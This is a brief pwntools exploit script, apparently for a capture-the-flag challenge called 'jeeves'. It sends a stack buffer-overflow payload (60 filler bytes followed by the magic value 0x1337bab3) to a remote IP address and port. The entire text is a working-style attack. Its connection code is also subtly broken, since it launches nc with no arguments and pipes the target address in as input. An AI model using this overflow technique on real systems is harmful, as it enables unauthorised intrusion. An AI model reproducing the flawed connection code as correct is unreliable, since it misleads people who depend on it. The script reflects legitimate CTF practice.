from pwn import *

#cyclic
payload = b'A'*(60) + p32(0x1337bab3)

#io = process('./jeeves')
io = process('nc')
io.sendline(b'138.68.183.154 30432')

#io.sendlineafter('?', payload)
#io.recvuntil(b'May I have your name? ')
io.sendline(payload)

print(io.recvline())
print(io.recvline())
'''
'''
